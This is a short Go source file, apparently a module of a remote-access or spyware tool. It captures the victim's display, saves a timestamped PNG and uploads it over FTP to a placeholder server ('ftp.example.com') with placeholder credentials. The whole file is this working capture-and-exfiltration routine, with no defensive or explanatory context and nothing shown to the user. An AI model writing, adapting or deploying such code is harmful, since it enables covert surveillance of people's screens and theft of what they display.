package screenmodul

import (
	"fmt"
	"image/png"
	"os"
	"time"

	"github.com/jlaffaye/ftp"
	"github.com/kbinani/screenshot"
)

func MakeScreenshot() {
	img, err := screenshot.CaptureDisplay(0)
	if err != nil {
		handleErr(err, "[-]\tScreenshot failed")
		return
	}

	fileName := "screenshot_" + time.Now().Format("2006-01-02_15-04-05") + ".png"
	filePath := "screenshot_list/" + fileName

	file, err := os.Create(filePath)
	if err != nil {
		handleErr(err, "[-]\tScreenshot file hasn't been created")
		return
	}
	defer file.Close()

	err = png.Encode(file, img)
	if err != nil {
		handleErr(err, "[-]\tBad encoded screenshot")
		return
	}

	ftpURL := "ftp.example.com"
	username := "your_username"
	password := "your_password"

	err = uploadScreenshot(file.Name(), ftpURL, username, password)
	if err != nil {
		handleErr(err, "[-]\tUploading screenshot has been failed")
	}
	fmt.Println("Screenshot uploaded successfully")
}

func uploadScreenshot(filePath, ftpURL, username, password string) error {
	file, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("[-]\tError opening file for upload: %v", err)
	}
	defer file.Close()

	conn, err := ftp.Dial(ftpURL)
	if err != nil {
		return fmt.Errorf("[-]\tConnection to FTP has failed: %v", err)
	}
	defer conn.Quit()

	if err := conn.Login(username, password); err != nil {
		return fmt.Errorf("[-]\tLogin to FTP has failed: %v", err)
	}

	if err := conn.Stor("/path/destination/"+file.Name(), file); err != nil {
		return fmt.Errorf("[-]\tUploading file to FTP has failed: %v", err)
	}
	return nil
}

func handleErr(err error, errMsg string) {
	if err != nil {
		fmt.Println(errMsg, err)
	}
}
